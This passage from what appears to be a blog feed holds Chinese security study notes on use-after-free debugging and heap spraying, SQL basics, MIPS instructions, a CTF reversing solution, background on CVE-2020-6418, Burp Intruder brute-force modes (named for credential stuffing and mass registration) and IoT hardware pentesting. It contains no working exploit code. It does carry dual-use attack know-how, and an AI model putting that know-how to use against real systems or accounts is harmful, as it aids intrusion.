    <url>/2022/08/09/UAF%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>UAF漏洞是一种内存破坏漏洞，通常存在于浏览器中。</p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>uaf漏洞成因：一块堆内存被释放之后又被使用。<br>再一次被使用是指：指针存在（悬垂指针被引用）引用结果不可预测。</p><p>由于大多数堆内存都是C++对象，所以利用的核心思路即：分配堆去占坑，占的坑中又自己构造的虚表。</p><h2 id="分析方式"><a href="#分析方式" class="headerlink" title="分析方式"></a>分析方式</h2><p>分析uaf漏洞的要点在于弄清楚对象是在哪里被分配，被释放，被重用。</p><p>uaf异常触发点：对已释放的对象进行操作导致的异常，所以异常点即重用点。</p><p>而由于是对对象的操作，可以列出这个对象的所有方法，找出分配和释放的方法，对其下断来分析uaf过程。</p><blockquote><p>1.悬垂指针：指一类不指向任何合法的或者有效的（即与指针的含义不符）的对象的指针，比如一个对象的指针，如果这个对象已经被释放或者回收，但是指针没有进行任何的修改，仍然执行已被释放的内存，这个指针就叫做悬垂指针。</p><p>2.UAF漏洞：Use-AFTER-Free是一种内存破坏漏洞，简单来说，漏洞的原因是使用了悬垂指针。</p></blockquote><p>常见与UAF漏洞配合使用的是堆喷射，分配大量内存，增大靶子的面积，使eip跳进分配的内存中，而分配的内存中又充满了滑板指令，只要命中了滑板指令就可以命中shellcode</p><h2 id="调试方式"><a href="#调试方式" class="headerlink" title="调试方式"></a>调试方式</h2><p>对于uaf漏洞，调试器捕获到的异常并不是漏洞发生的第一现场，所以一般要使用gflags开启PageHeap和UST（windbg自带gflags工具）</p><p><code>gflags.exe /i 程序名.exe +hpa +ust</code></p><p>这样调试器会定位到最先出错的位置。</p><blockquote><p>技巧：<br>1.在ida中查找函数后，在windbg下断<br>2.打开poc文件后出现crash就是对象被重用，根据crash地址来找到重用的对象起始地址<br>3.对对象起始使用 <code>!heap -p -a 地址</code> 可获得这个对象的分配信息，由回溯还可以知道是什么函数分配的。<br>4.对分配函数下断到达分配现场<br>5.在回溯中，分配函数一般为RtlAllocateHeap的上层，而释放函数一般就是FreeHeap的上层。</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>chrome</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL学习与整理</title>
    <link href="/2022/08/09/SQL%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%95%B4%E7%90%86/"/>
    <url>/2022/08/09/SQL%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-SQL简介"><a href="#0x01-SQL简介" class="headerlink" title="0x01 SQL简介"></a>0x01 SQL简介</h2><p>SQL（结构化查询语言）用于访问和操作数据库中的数据的标准数据库编程语言。</p><p>SQL是关系数据库系统的标准语言，是一种ANSI标准的计算机语言。</p><p>要创建一个显示数据库中的数据的网站，需要：</p><ul><li>一个RDBMS数据库程序（MS Access SQL Server MySQL）</li><li>使用服务器端脚本语言（PHP ASP）</li><li>使用SQL来获取所需的数据</li><li>使用HTML/CSS来设置页面的样式</li></ul><h2 id="0x02-SQL-RDBMS概念"><a href="#0x02-SQL-RDBMS概念" class="headerlink" title="0x02 SQL RDBMS概念"></a>0x02 SQL RDBMS概念</h2><p>RDBMS是关系数据库管理系统的缩写，是SQL的基础。</p><h3 id="什么是表"><a href="#什么是表" class="headerlink" title="什么是表"></a>什么是表</h3><p>RDBMS中的数据存储在成为表的数据库对象中，这个表基本上是一个相关数据条目的集合，由许多列和行组成，表是关系数据库中最常见和最简单的数据存储形式。</p><h3 id="什么是字段"><a href="#什么是字段" class="headerlink" title="什么是字段"></a>什么是字段</h3><p>每个表都被分解成更小的实体，成为字段，Customers表中的字段由ID、姓名、年龄、地址和薪资组成。</p><p>字段是表中的列，用于维护有关表中每条记录的特定信息。</p><h3 id="什么是记录或者行数据"><a href="#什么是记录或者行数据" class="headerlink" title="什么是记录或者行数据"></a>什么是记录或者行数据</h3><p>记录也成为数据行，即表中存在的每个单独的条目。</p><p>记录是表中的水平实体。</p><h3 id="什么是列？"><a href="#什么是列？" class="headerlink" title="什么是列？"></a>什么是列？</h3><p>列是表彰的垂直实体，其中包含与表中特定字段关联的所有信息。</p><h3 id="什么是空值"><a href="#什么是空值" class="headerlink" title="什么是空值"></a>什么是空值</h3><p>表中的空值是显示为空的字段中的值，这意味中具有空值的字段是没有值的字段。</p><h3 id="SQL约束"><a href="#SQL约束" class="headerlink" title="SQL约束"></a>SQL约束</h3><p>约束是在表上的数据列上强制执行的规则，用于限制可以进入表中的数据类型，这确保了数据库中数据的准确性和可靠性。<br>约束可以是列级别，也可以是表级别，列级约束仅应用于一列，而表级约束则应用于整个表。</p><ul><li>NOT NULL约束：保列中数据不能有NULL值。</li><li>DEFAULT约束：提供该列数据未指定时所采用的默认值。</li><li>UNIQUE约束：保证列中的所有数据各不相同。</li><li>主键约束：唯一标识数据表中的行/记录</li><li>外键约束：唯一标识其他表中的一条行/记录</li><li>CHECK约束：此约束保证列中的所有值满足某一条件</li><li>索引：用于在数据库中快速创建或检索数据</li></ul><p>约束可以在创建表时规定（通过CREATE TABLE语句）或者在表创建减值后规定（通过ALTER TABLE语句）。</p><h3 id="数据完整性"><a href="#数据完整性" class="headerlink" title="数据完整性"></a>数据完整性</h3><p>每个关系数据库管理系统都存在以下类型的数据完整性：</p><ul><li>实体完整性-表中无重复行</li><li>域完整性-通过限制值的类型，格式或范围来强制执行给定列的有效条目</li><li>引用完整性-不能删除其他记录使用的行。</li><li>用户定义的完整性-强制执行一些不属于实体、域或引用完整性的特定业务规则。</li></ul><h3 id="数据库规范化"><a href="#数据库规范化" class="headerlink" title="数据库规范化"></a>数据库规范化</h3><p>数据库规范化是在数据库中有效的组织数据的过程，这个规范化过程有两个原因：</p><ul><li>消除多余数据</li><li>确保数据依赖关系是有意义的</li></ul><p>规范化指导原则称为范式，范式的目的是组织数据库结构，使其符合第一范式、第二范式和第三范式的规则。</p><h2 id="0x03-SQL语法"><a href="#0x03-SQL语法" class="headerlink" title="0x03 SQL语法"></a>0x03 SQL语法</h2><h3 id="SQL语法规则"><a href="#SQL语法规则" class="headerlink" title="SQL语法规则"></a>SQL语法规则</h3><ul><li>SQL语句总是以关键字开始，如SELECT、INSERT、UPDATE、DELETE、DROP、CREATE.</li><li>SQL语句以分号结尾</li><li>SQL不区分大小写。</li></ul><h3 id="数据库表"><a href="#数据库表" class="headerlink" title="数据库表"></a>数据库表</h3><p>数据库通常包含一个或多个表，每个表都用一个名称标识，该表包含带有数据的记录。</p><h3 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h3><p><code>SELECT * FROM Customers;</code></p><h3 id="一些重要的SQL命令"><a href="#一些重要的SQL命令" class="headerlink" title="一些重要的SQL命令"></a>一些重要的SQL命令</h3><ul><li><p>SELECT：从数据库中提取数据</p></li><li><p>UPDATE：更新数据库中的数据</p></li><li><p>DALETE：从数据库中删除数据</p></li><li><p>INSERT INTO：向数据库中插入新数据</p></li><li><p>CREATE DATABASE：创建新数据库</p></li><li><p>ALTER DATABASE:修改数据库</p></li><li><p>CREATE TABLE：创建数据库</p></li><li><p>ALTER TABLE:变更数据库表</p></li><li><p>DROP TABLE:删除表</p></li><li><p>CREATE INDEX：创建索引</p></li><li><p>DROP INDEX：删除索引</p></li><li><p>SELECT:<code>SELECT column_name(s) FROM table_name</code></p></li><li><p>SELECT语句和WHERE子句：<code>SELECT [*] FROM [TableName] WHERE [condition]</code></p></li><li><p>SELECT语句和WHERE和/或子句：<code>SELECT [*] FROM [TableName] WHERE [condition1] [AND [or]] [condition2]...</code></p></li><li><p>SELECT语句与ORDER BY:</p><ul><li><code>SELECT column_name()</code></li><li><code>FROM table_name</code></li><li><code>ORDER BY column_name() ASC or DESC</code></li></ul></li><li><p>SELECT DISTINCT（区分）子句：</p><ul><li><code>SELECT DISTINCT column1,...columnN</code></li><li><code>FROM table_name;</code></li></ul></li><li><p>SELECT IN子句：</p><ul><li><code>SELECT column1,column2...columnN</code></li><li><code>FROM table_name</code></li><li><code>WHERE column_name IN (val-1,val-2,...val-N);</code></li></ul></li><li><p>SELECT LIKE(类)子句：</p><ul><li><code>SELECT column1,column2...columnN</code></li><li><code>FROM table_name</code></li><li><code>WHERE column_name LIKE {PATTERN};</code></li></ul></li><li><p>SELECT COUNT（计数）子句：</p><ul><li><code>SELECT COUNT(column_name)</code></li><li><code>FROM table_name</code></li><li><code>WHERE CONDITION;</code></li></ul></li><li><p>SELECT与HAVING子句：</p><ul><li><code>SELECT SUM(column_name)</code></li><li><code>FROM table_name</code></li><li><code>WHERE CONDITION</code></li><li><code>GROUP BY column_name</code></li><li><code>HAVING (arithematic function condition);</code></li></ul></li><li><p>INSERT INTO语句：</p><ul><li><code>INSERT INTO table_name(column1,column2,column3,...)</code></li><li><code>VALUES (value,value1,value2,value3...)</code></li></ul></li><li><p>UPDATE语句：</p><ul><li><code>UPDATE table_name</code></li><li><code>SET column=value,column1=value1</code></li><li><code>WHERE someColumn=someValue</code></li></ul></li><li><p>DELETE语句：</p><ul><li><code>DELETE FROM tableName</code></li><li><code>WHERE someColumn=someValue</code></li></ul></li><li><p>CREATE语句：</p><ul><li><code>CREATE TABLE table_name(column1  datatype,column2 datatype,column3 datatype,...columnN datatype,PRIMARY KEY(one or moe columns ));</code></li></ul></li><li><p>DROP语句：</p><ul><li><code>DROP TABLE table_name;</code></li></ul></li><li><p>DROP INDEX语句：</p><ul><li><code>AL TER TABLE table_name</code></li><li><code>DROP INDEX index_name;</code></li></ul></li><li><p>DESC语句：</p><ul><li><code>DESC table_name;</code></li></ul></li><li><p>TRUNCATE截断表语句：</p><ul><li><code>TRUNCATE TABLE table_name;</code></li></ul></li><li><p>ALTER TABLE语句：</p><ul><li><code>ALTER TABLE table_name{ADD|DROP|MODIFY} column_name {data_type};</code></li></ul></li><li><p>ALTER TABLE(对表名重命名)</p><ul><li><code>ALTER TABLE table_name RENAME TO new_table_name;</code></li></ul></li><li><p>USE语句：</p><ul><li><code>USE database_name;</code></li></ul></li><li><p>COMMIT语句：</p><ul><li><code>COMMIT;</code></li></ul></li><li><p>ROLLBACK语句：</p><ul><li><code>ROLLBACK;</code></li></ul></li></ul><h2 id="0x04-SQL选择"><a href="#0x04-SQL选择" class="headerlink" title="0x04 SQL选择"></a>0x04 SQL选择</h2>]]></content>
    
    
    
    <tags>
      
      <tag>学习记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MIPS架构学习笔记</title>
    <link href="/2022/08/09/MIPS%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/08/09/MIPS%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-寄存器"><a href="#0x01-寄存器" class="headerlink" title="0x01 寄存器"></a>0x01 寄存器</h1><h3 id="32个通用寄存器：-0-31-32位"><a href="#32个通用寄存器：-0-31-32位" class="headerlink" title="32个通用寄存器：$0-$31,32位"></a>32个通用寄存器：$0-$31,32位</h3><p>MIPS32中通用寄存器的约定用法：</p><p>|:–:|:–:|<br>|寄存器名字|约定名字|用途|<br>|$0|zero|总是为0|<br>|$1|at|留作汇编器生成一些合成指令|<br>|$2 $3|v0 v1|用来存放子程序返回值|<br>|$4<del>$7|a0</del>a3|调用子程序时，使用这4个寄存器传输前4个非浮点参数|<br>|$8<del>$15|t0</del>t7|临时寄存器，子程序使用时可以不用存储和恢复|<br>|$16<del>$23|s0</del>s7|子程序寄存器变量，改变这些寄存器值的子程序必须存储旧的值并在退出前恢复，对调用程序来说值不变|<br>|$24 $25|t8 t9|临时寄存器，子程序使用时可以不用存储和恢复|<br>|$26 $27|$k0 $k1|由异常处理程序使用|<br>|$28或$gp|gp|全局指针|<br>|$29或$sp|sp|堆栈指针|<br>|$30或$fp|s8/sp|子程序可以用来做堆栈帧指针|<br>|$31|ra|存放子程序返回地址|</p><h3 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a>特殊寄存器</h3><ul><li>PC:程序计数器</li><li>HI:乘除结果高位寄存器</li><li>LO:乘除结果低位寄存器</li></ul><p><b>MIPS架构属于小端模式</b></p><h3 id="MIPS指令"><a href="#MIPS指令" class="headerlink" title="MIPS指令"></a>MIPS指令</h3><p>|:—-:|:—-:|<br>|指令|功能|<br>|LB|从存储器中读取一个字节的数据到寄存器中|<br>|LH|从存储器中读取半个字的数据到寄存器中|<br>|LW|从存储器中读取一个字的数据到寄存器中|<br>|LD|从存储器中读取双字的数据到寄存器中|<br>|L.S|从存储器中读取单精度浮点数到寄存器中|<br>|L.D|从存储器中读取双精度浮点数到寄存器中|<br>|LBU|=LB,无符号数据|<br>|LHU|=LH,无符号数据|<br>|LWU|=LW,无符号数据|<br>|SB|把一个字节的数据从寄存器存储到存储器中|<br>|SH|把半个字节的数据从寄存器存储到存储器中|<br>|SW|把一个字的数据从寄存器存储到存储器中|<br>|SD|把两个字节的数据从寄存器存储到存储器中|<br>|S.S|把单精度浮点数从寄存器存储到存储器中|<br>|S.D|把双精度数据从存储器存储到存储器中|<br>|DADD|把两个定点寄存器的内容相加，即定点加|<br>|DADDI|把一个寄存器的内容加上一个立即数|<br>|DADDU|不带符号的加|<br>|DADDIU|把一个寄存器的内容加上一个无符号的立即数|<br>|ADD.S|把一个单精度浮点数加上一个双精度浮点数，结果是单精度浮点数|<br>|ADD.D|把一个双精度浮点数加上一个单精度浮点数，结果是双精度浮点数|<br>|ADD.PS|两个单精度浮点数相加，结果是单精度浮点数|<br>|DSUB|两个寄存器的内容相减|<br>|DSUBU|不带符号的减|<br>|SUB.S|一个双精度浮点数减去一个单精度浮点数，结果是单精度浮点数|<br>|SUB.D|一个双精度浮点数减去一个单精度浮点数，结果为双精度浮点数|<br>|SUB.PS|两个单精度浮点数相减|<br>|DDIV|两个顶点寄存器的内容相除|<br>|DDIVU|不带符号的除法运算|<br>|DIV.S|双精度浮点数除以单精度浮点数，结果为单精度浮点数|<br>|DIV.D|双精度浮点数除以单精度浮点数，结果为双精度浮点数|<br>|DIV.PS|两个单精度浮点数相除，结果为单精度|<br>|DMUL|两个定点寄存器的内容相乘|<br>|DMULU|无符号相乘|<br>|MUL.S|双浮点乘单浮点得单浮点|<br>|MUL.D|双浮点乘单浮点得双浮点|<br>|MUL.PS|两个单浮点乘，得单浮点|<br>|AND|与运算|<br>|ANDI|一个寄存器中的内容与一个立即数相与|<br>|OR|或运算|<br>|ORI||<br>|XOR|异或|<br>|XORI||<br>|BEQZ|条件转移指令，当寄存器中内容为0时转移发生|<br>|BENZ|条件转移指令，寄存器内容不为0时转移发生|<br>|BEQ|条件转移指令，两个寄存器内容相等是转移发生|<br>|BNE|条件转移指令，两个寄存器中内容不等时转移发生|<br>|J|直接跳转指令，跳转的地址在指令中|<br>|JR|使用寄存器的跳转指令，跳转的地址在寄存器中|<br>|JAL|直接跳转指令，带有链接功能，指令的跳转地址在指令中，跳转发生时要把返回地址存放到R31寄存器中|<br>|JALR|使用寄存器的跳转指令，并且带有链接功能，指令的跳转地址在寄存器中，跳转发生时指令的放回地址放在R31|<br>|MOV.S|把单浮点数从浮点寄存器复制到另一个浮点寄存器|<br>|MOV.D|把一个双浮点数从一个浮点寄存器复制到另一个浮点寄存器|<br>|MFC0|把一个数据从通用寄存器复制到特殊寄存器|<br>|MTC0|把一个数据从特殊寄存器复制到通用寄存器|<br>|MFC1|把一个数据从定点寄存器复制到浮点寄存器|<br>|MTC1|把一个数据从浮点寄存器复制到定点寄存器|<br>|LUI|把一个16位的立即数填入到寄存器的高16位，低16位补零|<br>|DSLL|双字逻辑左移|<br>|DSRL|双字逻辑右移|<br>|DSRA|双字算术右移|<br>|DSLLV|可变的双字逻辑左移|<br>|DSRLV|可变的双字逻辑右移|<br>|DSRAV|可变的双字算术右移|<br>|SLT|如果r2的值小于r3，设置r1为1，否在设置r1为0|<br>|SLTI|r2的值小于立即数，则r1为1，否则为0|<br>|SLTU|=SLT带符号|<br>|SLTUI|=SLT不带符号|<br>|MOVN|若第三个寄存器内容为负，那么复制一个寄存器内容到另一个寄存器|<br>|MOVZ|若第三个寄存器内容为0，则复制一个寄存器的内容到另一个寄存器|<br>|TRAP|根据地址向量转入管态|<br>|ERET|从异常中返回到用户态|<br>|MADD.S|一个双浮点数与单浮点数相乘加，结果为单|<br>|MADD.D|一个双浮点数与单浮点数相乘加，结果为双|<br>|MADD.PS|两个单浮点数相乘加，结果为单|</p><h3 id="大端序小端序复习"><a href="#大端序小端序复习" class="headerlink" title="大端序小端序复习"></a>大端序小端序复习</h3><p>字节序，又称端序，尾须序，大小端序与硬件的体系结构有关，所有x86系列的pc机都是小断续，与操作系统无关，</p><p>大端字节序，高子杰存于内存低地址，弟子姐姐存于内存搞地质，小端字节序反之。</p>]]></content>
    
    
    
    <tags>
      
      <tag>IOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DDCTF RE windows_re2</title>
    <link href="/2022/08/09/DDCTF2019re/"/>
    <url>/2022/08/09/DDCTF2019re/</url>
    
    <content type="html"><![CDATA[<p>esp定律脱壳Aspack，然后ida分析一波。</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> sub<span class="hljs-constructor">_401320()</span><br>{<br>  <span class="hljs-built_in">char</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-C04h]</span><br>  <span class="hljs-built_in">char</span> v2; <span class="hljs-comment">// [esp+9h] [ebp-C03h]</span><br>  <span class="hljs-built_in">char</span> v3; <span class="hljs-comment">// [esp+408h] [ebp-804h]</span><br>  <span class="hljs-built_in">char</span> v4; <span class="hljs-comment">// [esp+409h] [ebp-803h]</span><br>  <span class="hljs-built_in">char</span> v5; <span class="hljs-comment">// [esp+808h] [ebp-404h]</span><br>  <span class="hljs-built_in">char</span> v6; <span class="hljs-comment">// [esp+809h] [ebp-403h]</span><br>  v3 = <span class="hljs-number">0</span>;<br>  sub<span class="hljs-constructor">_401C6A(&amp;<span class="hljs-params">v4</span>, 0, 0x3FF)</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  sub<span class="hljs-constructor">_401C6A(&amp;<span class="hljs-params">v6</span>, 0, 0x3FF)</span>;<br>  MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"input code:"</span>);<br>  MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785526D4</span>]</span>(<span class="hljs-string">"%s"</span>, &amp;v3);<br>  <span class="hljs-keyword">if</span> ( !(unsigned __int8)sub<span class="hljs-constructor">_4011F0()</span> )<br>  {<br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"invalid input\n"</span>);<br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x78542455</span>]</span>(<span class="hljs-number">0</span>);<br>  }<br>  sub<span class="hljs-constructor">_401240(&amp;<span class="hljs-params">v5</span>)</span>;<br>  v1 = <span class="hljs-number">0</span>;<br>  sub<span class="hljs-constructor">_401C6A(&amp;<span class="hljs-params">v2</span>, 0, 0x3FF)</span>;<br>  MEMORY<span class="hljs-literal">[<span class="hljs-number">0x78552E73</span>]</span>(&amp;v1, <span class="hljs-string">"DDCTF{%s}"</span>, &amp;v5);<br>  <span class="hljs-keyword">if</span> ( !strcmp(&amp;v1, <span class="hljs-string">"DDCTF{reverse+}"</span>) )<br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"You've got it !!! %s\n"</span>, &amp;v1);<br>  <span class="hljs-keyword">else</span><br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"Something wrong. Try again...\n"</span>);<br>  return <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>限制输入0-9,A-F,可想到十六进制</li><li>输入字符经过变换与“DDCTF{reverse+}”对比，相同则成功。</li></ul><p>先尝试输入字符串<code>1234567AAA</code>,得到加密后字符 <code>EjRWeqo=</code>,看着像base664,直接base64转成十六进制尝试，发现得到了我输入字符串。<br>将<code>reverse+</code>转换得到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>RE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2020-6418</title>
    <link href="/2022/08/09/CVE-2020-6418/"/>
    <url>/2022/08/09/CVE-2020-6418/</url>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>(资料来自绿盟科技)</p><p>2020年2月24日，google针对桌面版chrome浏览器发布更新以解决多个漏洞，包括已被发现的在野利用的高危漏洞CVE-2020-6418.</p><p>CVE-2020-6418存在于V8中的类型混淆漏洞，V8是chrome的开源JavaScript和WebAssembly引擎，该洞由Google威胁分析小组的Clement Lecigne发现并上报。</p><p>受影响产品版本：</p><p>Google Chrome Version&lt;80.0.3987.122</p><p>适用于windows,Mac,Linux.</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.nsfocus.net/cve-2020-6418">http://blog.nsfocus.net/cve-2020-6418</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>chrome调试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>burp四种密码爆破模式学习</title>
    <link href="/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<ul><li>Sniper:单参数爆破，多参数时同一个字典按顺序替换各参数，初始值有一个参数不变</li><li>Battering ram:多参数同时爆破，但用的是同一个字典</li><li>Pitchfork:多参数同时爆破，但用的是不同的字典</li><li>Cluster bamb:多参数做笛卡尔乘积模式爆破</li></ul><h1 id="Sniper-狙击手"><a href="#Sniper-狙击手" class="headerlink" title="Sniper(狙击手)"></a>Sniper(狙击手)</h1><p>（一对一）</p><p>一个参数a，若payload有x个，则执行x次。</p><p>两个参数a、b,先执行爆破a的x次，再执行b的y次，共x+y次爆破。</p><ul><li>此模式主要适用于：竞争条件测试(选择NULL payloads)，密码、验证码暴力破解，重放攻击等场景</li></ul><h1 id="Battering-ram-破城槌"><a href="#Battering-ram-破城槌" class="headerlink" title="Battering ram(破城槌)"></a>Battering ram(破城槌)</h1><p>（payload一对多）</p><p>一个参数a，若payload有x个，则执行x次。</p><p>两个参数a、b,payload被同事放到a、b变量中。适合需要在请求中把相同的输入放到多个位置的情况。</p><ul><li>此模式主要适用于：撞库</li></ul><h1 id="Pitchfork-音叉"><a href="#Pitchfork-音叉" class="headerlink" title="Pitchfork(音叉)"></a>Pitchfork(音叉)</h1><p>可以多组密码本payload</p><p>a:1,2</p><p>b:3,4</p><p>第一次爆破为 1，3</p><p>第二次爆破为 2，4</p><ul><li>此模式主要适用于：恶意注册</li></ul><h1 id="Cluster-bomb-集束炸弹"><a href="#Cluster-bomb-集束炸弹" class="headerlink" title="Cluster bomb(集束炸弹)"></a>Cluster bomb(集束炸弹)</h1><p>（多对多）</p><p>对payload组进行笛卡尔积，交叉组合，即a的一个payload值与b的每一个值进行组合爆破。</p>]]></content>
    
    
    
    <tags>
      
      <tag>bp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《物联网渗透测试》学习笔记1</title>
    <link href="/2022/08/09/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
    <url>/2022/08/09/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-IOT渗透测试"><a href="#0x01-IOT渗透测试" class="headerlink" title="0x01 IOT渗透测试"></a>0x01 IOT渗透测试</h1><p>定义IoT生态系统与渗透测试生命周期</p><ul><li>渗透测试方法：<ul><li>黑盒测试</li><li>白盒测试</li><li>灰盒测试</li></ul></li></ul><h2 id="固件入门"><a href="#固件入门" class="headerlink" title="固件入门"></a>固件入门</h2><p>固件是一种写入硬件设备的软件，作用是对应用和各项系统功能实施控制，运行固件的设备称为嵌入式系统。</p><p>固件通常由bootloader、内核、文件系统以及其他资源组成，</p><p>固件组成：闪存、bootloader、内核、根文件系统。</p><ul><li>bootloader:主要作用包括RAM初始化（目的是存储易失性数据）、串口初始化、机器类型检测、内核参数链表设置、initramfs(基于RAM的初始文件系统)加载以及内核镜像调用等。ARM、MIPS架构中部分常见的bootloader包括：Redboot、u-boot以及barebox等。当bootloader启动内核之后，文件系统就完成了加载。</li><li>固件可以采用的文件系统类型：SquashFS、cramFS、JFFS2、YAFFS2以及ext2等。</li></ul><h2 id="IoT中的Web应用"><a href="#IoT中的Web应用" class="headerlink" title="IoT中的Web应用"></a>IoT中的Web应用</h2><p>通常嵌入书web应用被设计为在自包含的环境中运行</p><ul><li>目前iot领域主要有两种不同的web应用模型<ul><li>混合云模型：包含厂商或供应商提供的基于软件即服务的web应用，作用是同运行在嵌入式设备固件中的web应用程序建立连接，将数据从厂商的云服务器中同步到本地网络的嵌入式设备中。</li><li>独立嵌入式服务器模型</li></ul></li></ul><p>web通信：浏览器、、嵌入式服务器和web应用服务器之间的通信通常要么借助简单对象访问协议（SOAP）/XML等web服务，要么借助基于http/htps复合REST规范的API来实现。</p><h2 id="硬件设备基础"><a href="#硬件设备基础" class="headerlink" title="硬件设备基础"></a>硬件设备基础</h2><p>硬件输入：</p><ul><li>EEPROM，是非易失性存储器。以单个字节为单位进行读写，可通过电荷或紫外线照射擦除数据。读写次数有限。</li><li>NAND闪存以区块为单位读写。存储设备的boootloader。</li><li>UART接口是访问设备最为常见的方式。连接改接口后即可获得root权限。PCB上UART接口的引脚定义中包括Tx、Rx、Vcc和GND 4个引脚。连接UART接口前需要使用万用表识别出引脚。</li><li>JTAG接口是遵循IEEE 1149.1标准的另一种国际标准测试协议。用于芯片级和系统级的测试。，包含5个引脚：TDI、TDO、TMS、TCK、TRST.可以接到芯片的tap（测试访问口）</li></ul><h2 id="IoT无线通信简介"><a href="#IoT无线通信简介" class="headerlink" title="IoT无线通信简介"></a>IoT无线通信简介</h2><p>最常用协议：Wi-Fi(802.11)、ZigBee(802.15.4)、Z-Ware、蓝牙(802.15.1)、低功耗蓝牙。</p><h1 id="IoT威胁建模"><a href="#IoT威胁建模" class="headerlink" title="IoT威胁建模"></a>IoT威胁建模</h1>]]></content>
    
    
    
    <tags>
      
      <tag>IOT 《物联网渗透测试》</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《ARM嵌入式Linux系统开发详解》学习笔记1</title>
    <link href="/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
    <url>/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
    
